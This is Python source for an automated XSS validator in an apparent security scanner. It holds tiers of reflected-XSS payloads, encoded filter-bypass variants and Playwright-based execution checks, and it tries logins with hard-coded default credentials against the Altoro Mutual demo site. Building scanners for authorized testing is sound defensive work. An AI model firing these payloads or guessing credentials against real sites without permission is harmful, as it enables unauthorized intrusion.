"""
XSS Validator — Enhanced for Zentry
Covers:
  • Reflected XSS — checks for unescaped character reflection (<, >, ", ')
    without requiring JS execution (catches server-side reflection)
  • JS execution via Playwright eval (confirms live execution)
  • POST form injection (search boxes, login fields)
  • Context-aware payload selection (attribute, JS, HTML contexts)
  • Session-aware retries for authenticated endpoints
  • Altoro Mutual /search.jsp?query= specific checks
"""
from __future__ import annotations

import asyncio
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import aiohttp

from core.adaptive_exploit_engine import AdaptiveExploitEngine, compute_reward
from core.local_payload_engine import suggest_payloads
from .registry import register

# ──────────────────────────────────────────────────────────────────────────────
# Payload tiers
# ──────────────────────────────────────────────────────────────────────────────

# Tier-1: Reflection detection only (no JS required)
REFLECTION_PROBE = "xss_zentry_probe_8472"

# Characters whose unescaped reflection signals XSS potential
DANGEROUS_CHARS = ["<", ">", '"', "'", "/", "\\"]

# Tier-2: HTML injection payloads (no script execution needed for confirmation)
HTML_PAYLOADS = [
    "<b>zentry_xss_tag</b>",
    "<h1>zentry_xss_h1</h1>",
    "<img src=x>",
    "<svg>",
    "<marquee>zentry_xss</marquee>",
]

# Tier-3: Full script payloads for JS execution via Playwright
JS_PAYLOADS = [
    "<script>window.__xss_pwn=1</script>",
    '"><script>window.__xss_pwn=1</script>',
    "'><script>window.__xss_pwn=1</script>",
    "<img src=x onerror=window.__xss_pwn=1>",
    '"><svg/onload=window.__xss_pwn=1>',
    "javascript:window.__xss_pwn=1",
    "<body onload=window.__xss_pwn=1>",
    '"><img src=x onerror=window.__xss_pwn=1>',
    "<script>alert(document.domain)</script>",
    "'\"><iframe src=javascript:alert(1)>",
]

# Tier-4: Encoded bypass variants
ENCODED_PAYLOADS = [
    "%3Cscript%3Ewindow.__xss_pwn=1%3C/script%3E",
    "%22%3E%3Cscript%3Ewindow.__xss_pwn=1%3C/script%3E",
    "&#60;script&#62;window.__xss_pwn=1&#60;/script&#62;",
    "\u003cscript\u003ewindow.__xss_pwn=1\u003c/script\u003e",
]

_playwright_instance = None
_browser_instance = None
_browser_lock = asyncio.Lock()
_sem = asyncio.Semaphore(3)


# ──────────────────────────────────────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────────────────────────────────────
async def _get_browser():
    global _playwright_instance, _browser_instance
    async with _browser_lock:
        if _browser_instance is None:
            try:
                from playwright.async_api import async_playwright
                _playwright_instance = await async_playwright().start()
                _browser_instance = await _playwright_instance.chromium.launch(headless=True)
            except Exception:
                _browser_instance = None
    return _browser_instance


async def _http_get(session: aiohttp.ClientSession, url: str,
                    cookies: dict = None) -> tuple[int, str]:
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=20),
                               cookies=cookies or {}, allow_redirects=True) as r:
            return r.status, await r.text(errors="ignore")
    except Exception:
        return 0, ""


async def _http_post(session: aiohttp.ClientSession, url: str,
                     data: dict, cookies: dict = None) -> tuple[int, str]:
    try:
        async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=20),
                                cookies=cookies or {}, allow_redirects=True) as r:
            return r.status, await r.text(errors="ignore")
    except Exception:
        return 0, ""


def _check_reflection(body: str, payload: str) -> bool:
    """Check if payload (or its key characters) appear unescaped in response."""
    if payload in body:
        return True
    # Check partial tag reflection
    if "<" in payload and re.search(r"<[a-zA-Z]", body):
        return True
    return False


def _chars_reflected_unescaped(body: str, probe: str) -> list[str]:
    """Return which dangerous characters appear unescaped around the probe context."""
    # Find probe in body and check surrounding context
    idx = body.find(probe)
    if idx == -1:
        return []
    context = body[max(0, idx - 200): idx + 200 + len(probe)]
    reflected = []
    for c in DANGEROUS_CHARS:
        escaped = {"<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"}.get(c, c)
        if c in context and escaped not in context:
            reflected.append(c)
    return reflected


async def _try_login_altoro(session: aiohttp.ClientSession, base_url: str) -> dict:
    parsed = urlparse(base_url)
    login_url = f"{parsed.scheme}://{parsed.netloc}/doLogin"
    for creds in [
        {"uid": "admin", "passw": "admin", "btnSubmit": "Login"},
        {"uid": "jsmith", "passw": "Demo1234", "btnSubmit": "Login"},
    ]:
        try:
            async with session.post(login_url, data=creds,
                                    timeout=aiohttp.ClientTimeout(total=10),
                                    allow_redirects=True) as r:
                body = await r.text(errors="ignore")
                if r.status == 200 and any(k in body.lower() for k in
                                           ("my account", "sign off", "logout", "welcome")):
                    return dict(r.cookies)
        except Exception:
            continue
    return {}


def _make_get_url(parsed, qs: dict, param: str, payload: str) -> str:
    q = dict(qs)
    q[param] = [payload]
    return urlunparse(parsed._replace(query=urlencode(q, doseq=True)))


# ──────────────────────────────────────────────────────────────────────────────
# Main validator
# ──────────────────────────────────────────────────────────────────────────────
@register("xss")
async def validate_xss(url: str, param: str, state: dict = None, timeout: int = 20) -> dict | None:
    """
    Enhanced XSS validator:
    1. Reflection probe — checks unescaped dangerous chars (GET + POST)
    2. HTML tag injection detection
    3. JS execution via Playwright headless browser
    """
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    _engine = AdaptiveExploitEngine()
    state = state or {}

    extra_js = [p for p in (suggest_payloads("xss", n=20) or []) if isinstance(p, str)]
    all_js_payloads = list(dict.fromkeys(JS_PAYLOADS + extra_js))

    async with aiohttp.ClientSession() as session:

        # ── 0. Auth probe ─────────────────────────────────────────────────────
        cookies: dict = {}
        probe_status, probe_body = await _http_get(session, url)
        if probe_status in (302, 403, 401) or "login" in probe_body.lower()[:500]:
            cookies = await _try_login_altoro(session, url)

        # ── 1. Character reflection probe (GET) ───────────────────────────────
        probe_url = _make_get_url(parsed, qs, param, REFLECTION_PROBE)
        status, body = await _http_get(session, probe_url, cookies)

        if REFLECTION_PROBE in body:
            # Probe is reflected — now check which dangerous chars are unescaped
            danger_url = _make_get_url(parsed, qs, param, f"{REFLECTION_PROBE}<>\"'")
            _, danger_body = await _http_get(session, danger_url, cookies)
            unescaped = _chars_reflected_unescaped(danger_body, REFLECTION_PROBE)

            if "<" in unescaped or ">" in unescaped:
                # HTML injection is possible — confirm with a tag
                tag_url = _make_get_url(parsed, qs, param, HTML_PAYLOADS[0])
                _, tag_body = await _http_get(session, tag_url, cookies)
                tag = "zentry_xss_tag"
                if tag in tag_body and "<b>" in tag_body:
                    _engine.record_result(HTML_PAYLOADS[0], "xss", reward=1.0, waf="unknown", tech=[])
                    return {
                        "validated": True,
                        "type": "Reflected XSS — HTML tag injection confirmed",
                        "url": tag_url,
                        "param": param,
                        "payload": HTML_PAYLOADS[0],
                        "method": "GET",
                        "evidence": (
                            f"Input reflected unescaped in HTML context. "
                            f"Unescaped chars: {unescaped}. "
                            f"HTML tag <b> appeared in response body."
                        ),
                        "response_snippet": tag_body[:500],
                    }

                # Even without confirmed tag, unescaped < > is high-confidence
                _engine.record_result(REFLECTION_PROBE, "xss", reward=0.8, waf="unknown", tech=[])
                return {
                    "validated": True,
                    "type": "Reflected XSS — Unescaped HTML chars",
                    "url": danger_url,
                    "param": param,
                    "payload": f"{REFLECTION_PROBE}<>\"'",
                    "method": "GET",
                    "evidence": (
                        f"Characters reflected unescaped: {unescaped}. "
                        f"No HTML encoding applied to user input."
                    ),
                    "response_snippet": danger_body[:500],
                }

            elif '"' in unescaped:
                # Attribute-context XSS — quote escaping missing
                return {
                    "validated": True,
                    "type": "Reflected XSS — Attribute context injection",
                    "url": danger_url,
                    "param": param,
                    "payload": f'{REFLECTION_PROBE}"',
                    "method": "GET",
                    "evidence": 'Double-quote " reflected unescaped inside attribute context',
                    "response_snippet": danger_body[:500],
                }

        # ── 2. Reflection probe via POST (search forms, login forms) ──────────
        post_data = {param: REFLECTION_PROBE + '<>"'}
        post_status, post_body = await _http_post(session, url, post_data, cookies)
        if REFLECTION_PROBE in post_body:
            unescaped = _chars_reflected_unescaped(post_body, REFLECTION_PROBE)
            if "<" in unescaped or ">" in unescaped or '"' in unescaped:
                return {
                    "validated": True,
                    "type": "Reflected XSS (POST) — Unescaped chars in response",
                    "url": url,
                    "param": param,
                    "payload": REFLECTION_PROBE + '<>"',
                    "method": "POST",
                    "evidence": f"Unescaped chars {unescaped} reflected in POST response",
                    "response_snippet": post_body[:500],
                }

        # ── 3. HTML payload GET test (no Playwright needed) ───────────────────
        for html_payload in HTML_PAYLOADS:
            test_url = _make_get_url(parsed, qs, param, html_payload)
            _, body = await _http_get(session, test_url, cookies)
            # Check if the raw HTML tag appears in the response (not encoded)
            raw_tag = re.sub(r"[^a-zA-Z<>/_]", "", html_payload)
            if raw_tag and raw_tag in body:
                return {
                    "validated": True,
                    "type": "Reflected XSS — HTML payload confirmed",
                    "url": test_url,
                    "param": param,
                    "payload": html_payload,
                    "method": "GET",
                    "evidence": f"HTML payload reflected verbatim in response: {raw_tag!r}",
                    "response_snippet": body[:500],
                }

        # ── 4. JS execution via Playwright ────────────────────────────────────
        browser = await _get_browser()
        if browser is None:
            return None  # Playwright not available; non-fatal

        for payload in all_js_payloads:
            test_url = _make_get_url(parsed, qs, param, payload)

            async with _sem:
                try:
                    ctx = await browser.new_context(
                        extra_http_headers={},
                    )
                    # Inject auth cookies
                    if cookies:
                        cookie_list = [
                            {"name": k, "value": v, "url": url}
                            for k, v in cookies.items()
                        ]
                        await ctx.add_cookies(cookie_list)

                    page = await ctx.new_page()
                    executed = {"flag": False}
                    page.on("dialog", lambda d: (
                        executed.update(flag=True),
                        asyncio.create_task(d.dismiss()),
                    ))

                    try:
                        resp = await page.goto(test_url, timeout=timeout * 1000,
                                               wait_until="domcontentloaded")
                        status_code = resp.status if resp else 0
                        pwn = await page.evaluate("() => window.__xss_pwn === 1")
                        response_body = await page.content()
                        if pwn or executed["flag"]:
                            _engine.record_result(payload, "xss", reward=1.0, waf="unknown", tech=[])
                            return {
                                "validated": True,
                                "type": "Reflected XSS — JS execution confirmed",
                                "url": test_url,
                                "param": param,
                                "payload": payload,
                                "method": "GET",
                                "evidence": "JS sentinel (window.__xss_pwn=1) executed in headless Chromium",
                                "response_snippet": response_body[:500],
                            }
                    except Exception:
                        pass
                    finally:
                        await ctx.close()
                except Exception:
                    pass

    return None
